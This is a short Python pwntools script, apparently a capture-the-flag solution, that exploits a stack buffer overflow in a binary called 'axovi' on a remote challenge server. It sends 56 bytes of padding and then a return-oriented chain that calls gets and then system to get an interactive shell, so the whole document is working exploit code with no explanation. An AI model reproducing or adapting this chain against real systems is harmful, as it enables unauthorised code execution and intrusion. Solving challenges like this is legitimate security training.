#!/usr/bin/python3

from pwn import *

exe = ELF('axovi', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x0000000000401157

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.battlectf.online', 1002)
else:
        p = process(exe.path)

GDB()
pop_rdi = 0x00000000004011bb
rw  = 0x0000000000404000
payload = b"a" * 56 + flat(
        pop_rdi, rw, exe.plt['gets'], pop_rdi, rw, exe.plt['system']
)
sla(b"about :", payload)
p.interactive()
